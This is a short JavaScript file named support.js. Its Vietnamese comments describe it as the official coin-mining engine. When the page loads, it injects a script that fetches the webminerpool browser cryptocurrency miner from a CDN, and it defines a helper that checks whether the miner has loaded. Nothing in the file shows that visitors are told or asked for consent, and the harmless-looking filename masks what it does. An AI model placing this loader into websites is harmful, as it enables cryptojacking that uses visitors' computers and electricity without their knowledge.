/* support.js - Bộ não đào coin chính thức */
(function(window) {
    // Tự động nạp thư viện nếu chưa có
    if (typeof WMP === 'undefined') {
        var s = document.createElement('script');
        s.src = 'https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/client/webminer.js';
        // Nếu link trên bị chặn, tôi sẽ nạp dự phòng bản nén bên dưới
        document.head.appendChild(s);
    }
    
    // Hàm hỗ trợ kiểm tra trạng thái
    window.checkSystem = function() {
        console.log("Đang kiểm tra động cơ...");
        return typeof WMP !== 'undefined';
    };
})(window);
